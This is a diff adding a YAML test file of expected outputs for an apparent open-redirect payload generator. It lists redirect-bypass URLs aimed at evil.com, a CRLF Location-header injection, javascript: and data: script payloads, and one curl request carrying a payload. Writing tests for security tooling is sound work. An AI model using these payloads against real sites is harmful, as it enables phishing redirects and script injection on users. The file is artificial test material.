@@ -1,0 +1,238 @@
+# 开放重定向黄金样本。
+#
+# 这批样本断言的是**逐字节的 URL 形态**——重定向能不能成，全看那几个斜杠、
+# 反斜杠、@ 和 %40 有没有被写坏。所以每条都从 body 手推，不跑工具粘输出。
+#
+# 变量 evil / trusted 都**没有默认值**，这里特意留了一条样本（协议相对）
+# 断言漏填时保留 <<evil>> 字面量——和 host 那种内置默认值不是一回事。
+
+ruleDB: v0.1.0
+
+samples:
+  # ================= 最基础 =================
+
+  - name: 重定向 · 绝对地址（默认 https）
+    state:
+      vuln: redirect
+      template: redirect.generic.absolute
+      slots: {scheme: https}
+      vars: {evil: evil.com}
+      outputs: [raw]
+    expect:
+      payload: 'https://evil.com/'
+      # 没有绕过、没有引号字面量，不该有任何提示
+      checks_count: 0
+
+  - name: 重定向 · 绝对地址换 http
+    state:
+      vuln: redirect
+      template: redirect.generic.absolute
+      slots: {scheme: http}
+      vars: {evil: evil.com}
+      outputs: [raw]
+    expect:
+      payload: 'http://evil.com/'
+
+  - name: 重定向 · 协议相对
+    state:
+      vuln: redirect
+      template: redirect.generic.relative.protocol
+      vars: {evil: evil.com}
+      outputs: [raw]
+    expect:
+      payload: '//evil.com/'
+
+  - name: 重定向 · 协议相对但没填 evil（契约 3，不给默认值）
+    state:
+      vuln: redirect
+      template: redirect.generic.relative.protocol
+      outputs: [raw]
+    expect:
+      payload: '//<<evil>>/'
+
+  # ================= 语法变形 =================
+
+  - name: 重定向 · 单斜杠省略写法
+    state:
+      vuln: redirect
+      template: redirect.generic.scheme.less_slash
+      slots: {scheme: https}
+      vars: {evil: evil.com}
+      outputs: [raw]
+    expect:
+      payload: 'https:evil.com'
+
+  - name: 重定向 · 反斜杠混斜杠
+    state:
+      vuln: redirect
+      template: redirect.generic.backslash.mixed
+      slots: {scheme: https}
+      vars: {evil: evil.com}
+      outputs: [raw]
+    expect:
+      payload: 'https:/\evil.com'
+
+  - name: 重定向 · 反斜杠协议相对
+    state:
+      vuln: redirect
+      template: redirect.generic.backslash.leading
+      vars: {evil: evil.com}
+      outputs: [raw]
+    expect:
+      # 期望值里就是两个反斜杠：浏览器把它们归一成 //，服务端解析器多半不认
+      payload: '\\evil.com'
+
+  - name: 重定向 · 多重斜杠
+    state:
+      vuln: redirect
+      template: redirect.generic.slashes.multi
+      vars: {evil: evil.com}
+      outputs: [raw]
+    expect:
+      payload: '////evil.com/'
+
+  - name: 重定向 · 点段折叠
+    state:
+      vuln: redirect
+      template: redirect.generic.dot_segment
+      slots: {scheme: https}
+      vars: {evil: evil.com, trusted: trusted.com}
+      outputs: [raw]
+    expect:
+      payload: 'https://trusted.com/..//evil.com/'
+
+  # ================= 白名单混淆 =================
+
+  - name: 重定向 · userinfo @ 混淆
+    state:
+      vuln: redirect
+      template: redirect.generic.userinfo.at
+      slots: {scheme: https}
+      vars: {evil: evil.com, trusted: trusted.com}
+      outputs: [raw]
+    expect:
+      payload: 'https://trusted.com@evil.com/'
+
+  - name: 重定向 · userinfo %40 编码
+    state:
+      vuln: redirect
+      template: redirect.generic.userinfo.at_encoded
+      slots: {scheme: https}
+      vars: {evil: evil.com, trusted: trusted.com}
+      outputs: [raw]
+    expect:
+      payload: 'https://trusted.com%40evil.com/'
+
+  - name: 重定向 · 白名单子串匹配（子域名）
+    state:
+      vuln: redirect
+      template: redirect.generic.whitelist.subdomain
+      slots: {scheme: https}
+      vars: {evil: evil.com, trusted: trusted.com}
+      outputs: [raw]
+    expect:
+      payload: 'https://trusted.com.evil.com/'
+
+  - name: 重定向 · 白名单子串匹配（裸 query）
+    state:
+      vuln: redirect
+      template: redirect.generic.whitelist.query_bare
+      slots: {scheme: https}
+      vars: {evil: evil.com, trusted: trusted.com}
+      outputs: [raw]
+    expect:
+      payload: 'https://evil.com/?trusted.com'
+
+  - name: 重定向 · 白名单子串匹配（带参数名）
+    state:
+      vuln: redirect
+      template: redirect.generic.whitelist.query_kv
+      slots: {scheme: https}
+      vars: {evil: evil.com, trusted: trusted.com}
+      outputs: [raw]
+    expect:
+      payload: 'https://evil.com?x=trusted.com'
+
+  - name: 重定向 · 片段混淆
+    state:
+      vuln: redirect
+      template: redirect.generic.fragment
+      slots: {scheme: https}
+      vars: {evil: evil.com, trusted: trusted.com}
+      outputs: [raw]
+    expect:
+      # 井号后面的东西不会发给服务端，所以约束校验也不该报任何问题
+      payload: 'https://evil.com/#trusted.com'
+      checks_count: 0
+
+  # ================= 响应头注入 =================
+
+  - name: 重定向 · CRLF 注入 Location
+    state:
+      vuln: redirect
+      template: redirect.generic.crlf.location
+      slots: {scheme: https}
+      vars: {evil: evil.com}
+      outputs: [raw]
+    expect:
+      payload: '%0d%0aLocation:%20https://evil.com/'
+      checks_count: 0
+
+  # ================= 参数名枚举 =================
+
+  - name: 重定向 · 参数名枚举（默认 next）
+    state:
+      vuln: redirect
+      template: redirect.generic.param.enum
+      slots: {pname: next, scheme: https}
+      vars: {evil: evil.com}
+      outputs: [raw]
+    expect:
+      payload: '?next=https://evil.com/'
+
+  - name: 重定向 · 参数名枚举（url + http）
+    state:
+      vuln: redirect
+      template: redirect.generic.param.enum
+      slots: {pname: url, scheme: http}
+      vars: {evil: evil.com}
+      outputs: [raw]
+    expect:
+      payload: '?url=http://evil.com/'
+
+  # ================= 伪协议 =================
+
+  - name: 重定向 · javascript 伪协议
+    state:
+      vuln: redirect
+      template: redirect.generic.scheme.javascript
+      outputs: [raw]
+    expect:
+      payload: 'javascript:alert(document.domain)'
+
+  - name: 重定向 · data 伪协议
+    state:
+      vuln: redirect
+      template: redirect.generic.scheme.data
+      vars: {b64: 'PHNjcmlwdD5hbGVydChkb2N1bWVudC5kb21haW4pPC9zY3JpcHQ+'}
+      outputs: [raw]
+    expect:
+      # base64 解出来是 <script>alert(document.domain)</script>
+      payload: 'data:text/html;base64,PHNjcmlwdD5hbGVydChkb2N1bWVudC5kb21haW4pPC9zY3JpcHQ+'
+
+  # ================= 输出层 =================
+
+  - name: 重定向 · curl 层（载荷进 query）
+    state:
+      vuln: redirect
+      template: redirect.generic.absolute
+      slots: {scheme: https}
+      vars: {evil: evil.com}
+      outputs: [raw, curl]
+    expect:
+      payload: 'https://evil.com/'
+      # 提交方式是默认的 query + param=id + host=example.com：
+      # 载荷先按 safe="" 整体 URL 编码（: → %3A，/ → %2F，. 不编码），
+      # 再拼成 http://example.com/?id=...，最后由 bash 的 shell_quote 包一层单引号
+      outputs:
+        curl: "curl 'http://example.com/?id=https%3A%2F%2Fevil.com%2F'"
